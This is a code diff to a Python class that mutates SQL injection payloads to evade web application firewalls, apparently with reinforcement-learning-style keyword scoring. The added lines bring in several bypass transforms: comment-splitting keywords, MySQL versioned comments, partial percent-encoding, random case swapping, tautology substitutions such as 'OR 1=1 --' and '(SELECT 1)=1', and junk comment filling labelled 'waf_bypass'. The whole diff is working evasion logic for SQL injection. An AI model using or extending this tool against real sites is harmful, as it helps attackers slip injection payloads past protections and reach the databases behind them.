@@ -3,7 +3,7 @@ import re
 
 class ASTMutator:
     def __init__(self, context="GENERIC"):
-        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA"]
+        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "XOR", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA", "DATABASE", "USER", "VERSION"]
         self.context = context
         # RL: Epsilon-Greedy parameters
         self.epsilon = 0.2  # Exploration rate
@@ -109,16 +109,16 @@ class ASTMutator:
         mutated = payload
         # Find keywords with low reputation in the current payload
         for kw, rep in self.keyword_reputation.items():
-            if kw in mutated.upper() and (rep < 0.8 or random.random() < 0.3):
+            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and (rep < 0.8 or random.random() < 0.3):
                 # Apply a bypass transformation
                 bypasses = [
                     lambda k: f"{k[:len(k)//2]}/**/{k[len(k)//2:]}",
-                    lambda k: f"/*!{k}*/",
-                    lambda k: "".join([f"%{ord(c):02X}" if random.random() < 0.3 else c for c in k]),
-                    lambda k: f"({k})" if k in ["SELECT", "UNION"] else k
+                    lambda k: f"/*!{random.randint(40000, 60000)}{k}*/",
+                    lambda k: "".join([f"%{ord(c):02x}" if random.random() < 0.4 else c for c in k]),
+                    lambda k: f"({k})" if k in ["SELECT", "UNION", "AND", "OR", "XOR"] else k,
+                    lambda k: "".join([c.swapcase() if random.random() < 0.5 else c for c in k])
                 ]
                 transform = random.choice(bypasses)
-                # Use regex to replace keyword while preserving case if possible
                 mutated = re.sub(rf'\b{kw}\b', transform(kw), mutated, flags=re.IGNORECASE)
         return mutated
 
@@ -170,13 +170,18 @@ class ASTMutator:
 
     def _logical_equivalents(self, payload):
         equivalents = {
-            r"1=1": ["true", "not false", "~0=~0", "8<=>8"],
-            r"\bOR\b": ["||", "XOR"],
-            r"\bAND\b": ["&&"]
+            r"1=1": ["true", "not false", "~1=~1", "8=8", "0x31=0x31", "(SELECT 1)=1"],
+            r"1=2": ["false", "not true", "1=0", "0=1", "(SELECT 1)=0"],
+            r"\bOR\b": ["||", "XOR", "OR 1=1 --", "OR true"],
+            r"\bAND\b": ["&&", "AND 1=1"],
+            r"\bXOR\b": ["OR", "||", "XOR true", "XOR 1=1"],
+            r"\btrue\b": ["1=1", "not 0", "XOR false", "(SELECT 1)"],
+            r"\bfalse\b": ["1=2", "0", "NULL", "(SELECT 0)"]
         }
         mutated = payload
         for pattern, alts in equivalents.items():
-            mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
+            if re.search(pattern, mutated, flags=re.IGNORECASE):
+                mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
         return mutated
 
     def _balance_union_columns(self, payload):
@@ -188,10 +193,13 @@ class ASTMutator:
         return payload
 
     def _junk_filling(self, payload):
-        junk = ["bypass", "attack_unit", "audit"]
+        junk = ["bypass", "attack_unit", "audit", "waf_bypass", "X"*8, "1337", "sys"]
+        coin = random.random()
+        if coin < 0.4 and " " in payload:
+            return payload.replace(" ", f"/*{random.choice(junk)}*/", 1)
         if "/**/" in payload:
             return payload.replace("/**/", f"/*{random.choice(junk)}*/")
-        return payload
+        return payload + f" -- {random.choice(junk)}"
 
     def _context_aware_mutation(self, payload):
         mutated = str(payload)
